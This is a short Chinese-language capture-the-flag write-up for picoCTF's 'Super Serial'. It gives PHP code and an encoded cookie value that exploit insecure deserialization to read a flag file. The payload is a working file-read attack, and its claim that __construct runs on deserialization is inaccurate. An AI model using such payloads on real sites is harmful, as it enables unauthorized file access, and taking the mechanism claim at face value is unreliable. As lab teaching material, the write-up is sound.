# Super Serial 15
>Try to recover the flag stored on this website http://mercury.picoctf.net:42449/

# Explore 
题目名字提示是反序列化，HuaHuaY学长在群里说关键类是access_log，构造读flag的类
```php
<?php
class access_log{
	public $log_file;
	function __construct() {
		$this->log_file = "../flag";
	}
	function __toString() {
		return $this->read_log();
	}
	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}
	function read_log() {
		return file_get_contents($this->log_file);
	}
}

$permissions =new access_log();
echo urlencode(base64_encode(serialize($permissions)));
```
将cookie的login设置为**urlencode(base64_encode(serialize($permissions)))**输出的
>TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9

在反序列化cookies的login时就会执行**__construct()**，读出flag